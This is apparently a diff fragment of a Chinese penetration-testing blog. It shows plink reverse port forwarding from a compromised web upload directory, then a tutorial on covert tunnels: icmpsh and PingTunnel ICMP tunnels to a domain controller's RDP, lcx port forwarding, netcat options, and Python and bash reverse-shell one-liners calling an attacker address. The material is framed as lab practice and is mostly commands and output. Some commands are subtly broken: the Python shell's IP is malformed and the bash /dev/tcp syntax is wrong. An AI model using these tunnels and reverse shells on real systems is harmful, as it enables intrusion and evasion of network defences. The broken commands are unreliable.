data-url="bWFpbHRvOiYjeDYzOyYjeDc1OyYjMTE0OyYjeDc2OyYjMTAxOyYjNTA7JiM1MzsmI3gzNTsmI3gzMTsmI3gzOTsmI3gyZDsmIzExNTsmIzEwNDsmI3g2MTsmI3gzMjsmI3gzNTsmIzU0OyYjNjQ7JiN4NmM7JiN4Njk7JiN4NjI7JiMxMTU7JiMxMTU7JiMxMDQ7JiM0NjsmI3g2ZjsmIzExNDsmI3g2Nzs=">&#x63;&#x75;&#114;&#x76;&#101;&#50;&#53;&#x35;&#x31;&#x39;&#x2d;&#115;&#104;&#x61;&#x32;&#x35;&#54;&#64;&#x6c;&#x69;&#x62;&#115;&#115;&#104;&#46;&#x6f;&#114;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiN4NzI7JiN4NzY7JiMxMDE7JiM1MDsmIzUzOyYjeDM1OyYjeDMxOyYjNTc7JiM0NTsmI3g3MzsmI3g2ODsmI3g2MTsmI3gzMjsmIzUzOyYjNTQ7JiM2NDsmI3g2YzsmIzEwNTsmI3g2MjsmI3g3MzsmI3g3MzsmI3g2ODsmIzQ2OyYjeDZmOyYjMTE0OyYjMTAzOw==">&#99;&#x75;&#x72;&#x76;&#101;&#50;&#53;&#x35;&#x31;&#57;&#45;&#x73;&#x68;&#x61;&#x32;&#53;&#54;&#64;&#x6c;&#105;&#x62;&#x73;&#x73;&#x68;&#46;&#x6f;&#114;&#103;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
+<p>C:\xampp\htdocs\gym\upload&gt;plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjeDZmOyYjeDZmOyYjeDc0OyYjeDQwOyYjeDMxOyYjeDMwOyYjeDJlOyYjNDk7JiN4MzA7JiM0NjsmI3gzMTsmIzU1OyYjeDJlOyYjeDMyOyYjNDk7JiN4MzY7">&#x72;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x30;&#x2e;&#49;&#x30;&#46;&#x31;&#55;&#x2e;&#x32;&#49;&#x36;<i class="fa fa-external-link-alt"></i></span><br>plink.exe -v -x -a -T -C -noagent -ssh -pw “root” -R 8888:127.0.0.1:8888 <span class="exturl" data-url="bWFpbHRvOiYjeDcyOyYjMTExOyYjeDZmOyYjMTE2OyYjNjQ7JiN4MzE7JiM0ODsmIzQ2OyYjeDMxOyYjNDg7JiM0NjsmI3gzMTsmI3gzNzsmI3gyZTsmI3gzMjsmIzQ5OyYjeDM2Ow==">&#x72;&#111;&#x6f;&#116;&#64;&#x31;&#48;&#46;&#x31;&#48;&#46;&#x31;&#x37;&#x2e;&#x32;&#49;&#x36;<i class="fa fa-external-link-alt"></i></span><br>Looking up host “10.10.17.216”<br>Connecting to 10.10.17.216 port 22<br>Server version: SSH-2.0-OpenSSH_8.3p1 Debian-1<br>Using SSH protocol version 2<br>We claim version: SSH-2.0-PuTTY_Release_0.63<br>Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiMxMTg7JiMxMDE7JiM1MDsmI3gzNTsmIzUzOyYjNDk7JiN4Mzk7JiN4MmQ7JiMxMTU7JiMxMDQ7JiM5NzsmIzUwOyYjeDM1OyYjeDM2OyYjeDQwOyYjMTA4OyYjeDY5OyYjeDYyOyYjeDczOyYjeDczOyYjMTA0OyYjNDY7JiMxMTE7JiN4NzI7JiN4Njc7">&#99;&#x75;&#114;&#118;&#101;&#50;&#x35;&#53;&#49;&#x39;&#x2d;&#115;&#104;&#97;&#50;&#x35;&#x36;&#x40;&#108;&#x69;&#x62;&#x73;&#x73;&#104;&#46;&#111;&#x72;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)<br>FATAL ERROR: Couldn’t agree a key exchange algorithm (available: curve25519-sha256,<span class="exturl" data-url="bWFpbHRvOiYjOTk7JiN4NzU7JiMxMTQ7JiMxMTg7JiMxMDE7JiN4MzI7JiM1MzsmIzUzOyYjeDMxOyYjNTc7JiN4MmQ7JiN4NzM7JiN4Njg7JiM5NzsmIzUwOyYjeDM1OyYjNTQ7JiN4NDA7JiMxMDg7JiN4Njk7JiN4NjI7JiMxMTU7JiN4NzM7JiN4Njg7JiM0NjsmIzExMTsmI3g3MjsmI3g2Nzs=">&#99;&#x75;&#114;&#118;&#101;&#x32;&#53;&#53;&#x31;&#57;&#x2d;&#x73;&#x68;&#97;&#50;&#x35;&#54;&#x40;&#108;&#x69;&#x62;&#115;&#x73;&#x68;&#46;&#111;&#x72;&#x67;<i class="fa fa-external-link-alt"></i></span>,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256)</p>
 </blockquote>
 <p><code>第二天我又来了，这回成功了！，这回换成了powershell。</code></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\xampp\htdocs\gym\upload&gt; .\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">.\plink.exe -v -x -a -T -C -noagent -ssh -pw <span class="string">&quot;root&quot;</span> -R 8888:127.0.0.1:8888 root@10.10.17.216</span><br><span class="line">Looking up host <span class="string">&quot;10.10.17.216&quot;</span> <span class="keyword">for</span> SSH connection</span><br><span class="line">Connecting to 10.10.17.216 port 22</span><br><span class="line">We claim version: SSH-2.0-PuTTY_Release_0.74</span><br><span class="line">Remote version: SSH-2.0-OpenSSH_8.3p1 Debian-1</span><br><span class="line">Using SSH protocol version 2</span><br><span class="line">Doing ECDH key exchange with curve Curve25519 and <span class="built_in">hash</span> SHA-256 (SHA-NI accelerated)</span><br><span class="line">Server also has ecdsa-sha2-nistp256/ssh-rsa host keys, but we don<span class="string">&#x27;t know any of them</span></span><br><span class="line"><span class="string">Host key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">The server&#x27;</span>s host key is not cached <span class="keyword">in</span> the registry. You</span><br><span class="line">have no guarantee that the server is the computer you</span><br><span class="line">think it is.</span><br><span class="line">The server<span class="string">&#x27;s ssh-ed25519 key fingerprint is:</span></span><br><span class="line"><span class="string">ssh-ed25519 255 83:5a:22:c2:54:d1:3b:98:fa:09:81:52:f2:3b:75:8e</span></span><br><span class="line"><span class="string">If you trust this host, enter &quot;y&quot; to add the key to</span></span><br><span class="line"><span class="string">PuTTY&#x27;</span>s cache and carry on connecting.</span><br><span class="line">If you want to carry on connecting just once, without</span><br><span class="line">adding the key to the cache, enter <span class="string">&quot;n&quot;</span>.</span><br><span class="line">If you <span class="keyword">do</span> not trust this host, press Return to abandon the</span><br><span class="line">connection.</span><br><span class="line">Store key <span class="keyword">in</span> cache? (y/n) y</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) outbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) outbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) compression after user authentication</span><br><span class="line">Initialised AES-256 SDCTR (AES-NI accelerated) inbound encryption</span><br><span class="line">Initialised HMAC-SHA-256 (SHA-NI accelerated) inbound MAC algorithm</span><br><span class="line">Will <span class="built_in">enable</span> zlib (RFC1950) decompression after user authentication</span><br><span class="line">Using username <span class="string">&quot;root&quot;</span>.</span><br><span class="line">Sent password</span><br><span class="line">Initialised delayed zlib (RFC1950) decompression</span><br><span class="line">Initialised delayed zlib (RFC1950) compression</span><br><span class="line">Access granted</span><br><span class="line">Requesting remote port 8888 forward to 127.0.0.1:8888</span><br><span class="line">Opening main session channel</span><br><span class="line">Remote port forwarding from 8888 enabled</span><br><span class="line">Opened main channel</span><br><span class="line">Started a shell/<span class="built_in">command</span></span><br><span class="line">Linux JIYE 5.7.0-kali1-amd64 <span class="comment">#1 SMP Debian 5.7.6-1kali2 (2020-07-01) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Kali GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">ls</span><br><span class="line">arachni</span><br><span class="line">cacert.der</span><br><span class="line">clash</span><br><span class="line">CS4.0</span><br><span class="line">Desktop</span><br><span class="line">Documents</span><br><span class="line">Downloads</span><br><span class="line">get-pip.py</span><br><span class="line">htb</span><br><span class="line">Lluna.ovpn</span><br><span class="line">Lluna.ovpn.bak</span><br><span class="line">Music</span><br><span class="line">Pictures</span><br><span class="line">Public</span><br><span class="line">python_shell</span><br><span class="line">Templates</span><br><span class="line">Videos</span><br><span class="line">vulnhub</span><br></pre></td></tr></table></figure>
@@ -4285,6 +4285,480 @@
 
 <h2 id="0x09-BloodHound域内分析工具"><a href="#0x09-BloodHound域内分析工具" class="headerlink" title="0x09.BloodHound域内分析工具"></a>0x09.BloodHound域内分析工具</h2><p><code>首先进行信息采集，然后导入分析即可</code></p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SharpHound.exe -c all</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>内网渗透测试</category>
+      </categories>
+      <tags>
+        <tag>windows</tag>
+        <tag>内网安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透测试-隐藏通信隧道技术</title>
+    <url>/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/</url>
+    <content><![CDATA[<h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01.基础知识"></a>0x01.基础知识</h2><blockquote>
+<p>完成内网信息搜集后，需要先判断流量是否出得去、进得来。隐藏通信隧道技术常用于在访问受限的网络环境中追踪数据流向和在非受信任的网络中实现安全的数据传输。</p>
+</blockquote>
+<h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><p>​        在渗透场景中，各种安全设备会检查对外连接的情况，如果发现异常，就会对通信进行阻断。因此建立专门的隐蔽隧道就十分必要，这能绕过端口屏蔽。<br>常用的隧道如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">网络层隧道：IPv6、ICMP、GRE</span><br><span class="line">传输层隧道：TCP、UDP、常规端口转发</span><br><span class="line">应用层隧道：SSH、HTTP、HTTPS、DNS</span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="2-判断内网的连通性"><a href="#2-判断内网的连通性" class="headerlink" title="2.判断内网的连通性"></a>2.判断内网的连通性</h3><p>​        判断内网的连通性是指判断机器能否上外网等。要综合判断各种协议（TCP、HTTP、DNS、ICMP等）及端口通信的情况。常见的允许流量流出的端口有80、8080、443、53、110、123等，常用的内网的连通性判断方法如下：</p>
+<p><code>ICMP协议</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><code>TCP协议</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -zv 10.1.1.5 3306</span><br></pre></td></tr></table></figure>
+
+<p><code>DNS协议</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nslookup www.baiduc.om 8.8.8.8</span><br><span class="line">dig @8.8.8.8 www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p><code>HTTP协议</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>​        还有一种情况是流量不能直接流出，需要在内网中设置代理，判断方法如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、查看网络连接，判断是否存在与其他机器的1080（不绝对）等端口的连接，可尝试运行ping -n 1 -a ip命令</span><br><span class="line">2、查看内网中是否有主机名类似于&quot;proxy&quot;的机器。</span><br><span class="line">3、查看IE浏览器的直接代理。</span><br><span class="line">4、根据pac（代理自动配置）文件的路径（远程、本地），将其下载并查看。</span><br><span class="line">5、执行如下命令，利用curl工具确认：</span><br><span class="line">    curl https://www.baidu.com            //不通</span><br><span class="line">    curl -x proxy-ip:port www.baidu.com        //通</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-网络层隧道技术"><a href="#0x02-网络层隧道技术" class="headerlink" title="0x02.网络层隧道技术"></a>0x02.网络层隧道技术</h2><h3 id="1-IPv6隧道"><a href="#1-IPv6隧道" class="headerlink" title="1.IPv6隧道"></a>1.IPv6隧道</h3><blockquote>
+<p>IPv6隧道技术是指通过IPv4隧道传输IPv6数据报文的技术，也就是说，将IPv6报文整体封装在IPv4数据报文中，以便在IPv4隧道中传输。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">因为现阶段的部分安全设备无法识别IPv6的通信技术，而大多数操作系统支持IPv6，因此可以通过某些软件来配置允许进行IPv6通信以此来避开防火墙和入侵检测系统，而即使设备支持IPv6，也可能无法正确分析封装了IPv6报文的IPv4数据包。</span><br><span class="line">支持IPv6隧道的工具有socat、6tunnel、nt6tunnel等。</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-ICMP隧道"><a href="#2-ICMP隧道" class="headerlink" title="2.ICMP隧道"></a>2.ICMP隧道</h3><blockquote>
+<p>在一般的通信协议里，如果两台设备要进行通信，首先肯定需要开放端口，而在ICMP下就不需要，在一些网络环境中如果使用各类上层隧道（HTTP、DNS、常规正反向端口转发等）进行的操作都失败后，常常会通过ping命令访问远程计算机，尝试建立ICMP隧道，将TCP/UDP数据封装在ICMP的ping数据包中，从而穿过防火墙。</p>
+</blockquote>
+<p><code>常用的ICMP隧道工具有icmpsh、PingTunnel、icmptunnel、powershell icmp等：</code></p>
+<h4 id="01-icmpsh"><a href="#01-icmpsh" class="headerlink" title="01.icmpsh"></a>01.icmpsh</h4><p><code>利用</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">本机：python2 icmpsh_m.py &lt;本机IP&gt; &lt;目标IP&gt;</span><br><span class="line">靶机：icmpsh -t &lt;外连主机IP&gt; -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
+
+<p><code>首先需要安装impacket</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载地址：https://github.com/SecureAuthCorp/impacket</span><br><span class="line">cd impacket</span><br><span class="line">python2 -m pip install .</span><br></pre></td></tr></table></figure>
+
+<p><code>先在kali上运行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br></pre></td></tr></table></figure>
+
+<p><code>在靶机上运行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">icmpsh -t 192.168.1.8 -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure>
+
+<p><code>得到shell</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@JIYE:~/Downloads/icmpsh# python2 icmpsh_m.py 192.168.1.8 192.168.1.6</span><br><span class="line">Microsoft Windows [�汾 5.2.3790]</span><br><span class="line">(C) ��Ȩ���� 1985-2003 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">admin-ad4c9d4d8\administrator</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter ��������:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : local</span><br><span class="line">   IP Address. . . . . . . . . . . . : 10.1.1.4</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 10.1.1.1</span><br><span class="line"></span><br><span class="line">Ethernet adapter �������� 2:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : </span><br><span class="line">   IP Address. . . . . . . . . . . . : 192.168.1.6</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">C:\icmpsh&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>抓包分析</code></p>
+<blockquote>
+<p>192.168.1.10向192.168.1.6发起请求whoami</p>
+</blockquote>
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121825789.png" class>
+
+<blockquote>
+<p>192.168.1.6向192.168.1.10响应</p>
+</blockquote>
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722121936653.png" class>
+
+<h4 id="02-PingTunnel"><a href="#02-PingTunnel" class="headerlink" title="02.PingTunnel"></a>02.PingTunnel</h4><p><code>安装依赖</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> cd libpcap-1.10.1</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">cd PingTunnel/</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line">遇到报错安装以下</span><br><span class="line">apt-get install flex byacc -y #我遇到的报错是缺这俩</span><br></pre></td></tr></table></figure>
+
+<p><code>利用</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kali攻击机</span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# ifconfig                                                                                                                                             71 ⨯</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:befd:d9fb:f05a:6005  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:20c:29ff:fe4f:2524  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        ether 00:0c:29:4f:25:24  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 12484  bytes 6520141 (6.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3141  bytes 662478 (646.9 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 44  bytes 2816 (2.7 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">web服务器</span><br><span class="line">[root@mail ~]# ifconfig</span><br><span class="line">ens32: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.1.11  netmask 255.255.255.0  broadcast 192.168.1.255</span><br><span class="line">        inet6 2409:8a15:3637:5ed0:63bf:e247:b694:9bca  prefixlen 64  scopeid 0x0&lt;global&gt;</span><br><span class="line">        inet6 fe80::93f3:83a7:a47f:dda4  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:5d  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 7482  bytes 1008757 (985.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 3140  bytes 833053 (813.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">ens34: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 10.1.1.6  netmask 255.255.255.0  broadcast 10.1.1.255</span><br><span class="line">        inet6 fe80::5577:a12e:72b8:66dd  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:a0:ac:67  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 851  bytes 366945 (358.3 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 509  bytes 68150 (66.5 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 109  bytes 6323 (6.1 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">内网DC</span><br><span class="line">C:\Users\Administrator&gt;ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 Ethernet0:</span><br><span class="line"></span><br><span class="line">   连接特定的 DNS 后缀 . . . . . . . : local</span><br><span class="line">   本地链接 IPv6 地址. . . . . . . . : fe80::b12d:4163:32df:fa72%4</span><br><span class="line">   IPv4 地址 . . . . . . . . . . . . : 10.1.1.5</span><br><span class="line">   子网掩码  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   默认网关. . . . . . . . . . . . . : 10.1.1.1</span><br></pre></td></tr></table></figure>
+
+<p><code>首先web服务器运行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ptunnel -x pass</span><br></pre></td></tr></table></figure>
+
+<p><code>kali运行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ptunnel -p 192.168.1.11 -lp 6666 -da 10.1.1.5 -dp 3389 -x pass</span><br><span class="line">上述命令含义：在访问kali的6666端口，会把DC 10.1.1.5的3389端口封装在ICMP隧道里，以web服务器192.168.1.11为ICMP隧道跳板进行传送。</span><br></pre></td></tr></table></figure>
+
+<p><code>参数</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-x    指定ICMP隧道连接的验证密码</span><br><span class="line">-lp 指定本地监听的TCP端口</span><br><span class="line">-da 指定要转发的目标机器IP</span><br><span class="line">-dp 指定要转发的目标机器TCP端口</span><br><span class="line">-p  指定ICMP隧道另一端机器的IP</span><br></pre></td></tr></table></figure>
+
+<p><code>登入</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">desktop 192.168.1.7:6666</span><br><span class="line">desktop 127.0.0.1:6666</span><br><span class="line">windows的mstsc登入也可以</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722145522318.png" class>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150059749.png" class>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150435797.png" class>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722150519192.png" class>
+
+<h2 id="0x03-传输层隧道"><a href="#0x03-传输层隧道" class="headerlink" title="0x03.传输层隧道"></a>0x03.传输层隧道</h2><h3 id="1-lcx内网端口转发"><a href="#1-lcx内网端口转发" class="headerlink" title="1.lcx内网端口转发"></a>1.lcx内网端口转发</h3><p><code>目标主机执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lcx.exe -slave 192.168.1.2 4444 127.0.0.1 3389    # 将本机3389端口转发到hack机4444端口</span><br></pre></td></tr></table></figure>
+
+<p><code>hack机执行</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">lcx.exe -listen  4444 5555    #将本机4444端口监听的所有数据传输到5555端口</span><br></pre></td></tr></table></figure>
+
+<p><code>hack机mstsc 127.0.0.1:5555登入</code></p>
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184135571.png" class>
+
+<img src="/2021/07/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image-20210722184150355.png" class>
+
+<h3 id="2-nc"><a href="#2-nc" class="headerlink" title="2.nc"></a>2.nc</h3><p><code>参数</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-d 后台模式</span><br><span class="line">-e 程序重定向</span><br><span class="line">-g &lt;网关&gt; 设置路由器跃程通信网关，最多可设置8个；</span><br><span class="line">-G &lt;指向器数目&gt; 设置来源路由指向器，其数值为4的倍数；</span><br><span class="line">-h 在线帮助；</span><br><span class="line">-i &lt;延迟秒数&gt; 设置时间间隔，以便传送信息及扫描通信端口；</span><br><span class="line">-l 使用监听模式，管控传入的资料；</span><br><span class="line">-n 直接使用IP地址，而不通过域名服务器；</span><br><span class="line">-o &lt;输出文件&gt; 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存；</span><br><span class="line">-p &lt;通信端口&gt; 设置本地主机使用的通信端口；</span><br><span class="line">-r 随机指定本地与远端主机的通信端口；</span><br><span class="line">-s &lt;来源位址&gt; 设置本地主机送出数据包的IP地址；</span><br><span class="line">-u 使用UDP传输协议；</span><br><span class="line">-v 详细输出；</span><br><span class="line">-w &lt;超时秒数&gt; 设置等待连线的时间；</span><br><span class="line">-z 将输入输出关掉，只在扫描通信端口时使用。</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3.反弹shell"></a>3.反弹shell</h3><h4 id="01-python反弹shell"><a href="#01-python反弹shell" class="headerlink" title="01.python反弹shell"></a>01.python反弹shell</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.1681.11&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="02-bash反弹shell"><a href="#02-bash反弹shell" class="headerlink" title="02.bash反弹shell"></a>02.bash反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp 192.168.1.11/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
